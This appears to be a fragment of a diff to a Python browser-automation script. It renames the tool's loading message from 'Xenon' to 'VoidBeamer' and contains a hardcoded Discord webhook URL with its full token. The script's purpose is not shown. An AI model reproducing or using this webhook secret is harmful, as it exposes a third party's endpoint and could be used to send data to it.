@@ -10,7 +10,7 @@ from selenium.webdriver.edge.options import Options as EdgeOptions
 from webdriver_manager.chrome import ChromeDriverManager
 from webdriver_manager.microsoft import EdgeChromiumDriverManager
 
-print("Loading Xenon...")
+print("Loading VoidBeamer...")
 
 # Webhook URL
 WEBHOOK_URL = "https://discord.com/api/webhooks/1347591981567840277/iZdHuzSQy1UuB9IJ6nz5oG-NSepNBqpFtNR3mmIZ82lKo5-4VwSQekeKjXBWOAF8AE4S"
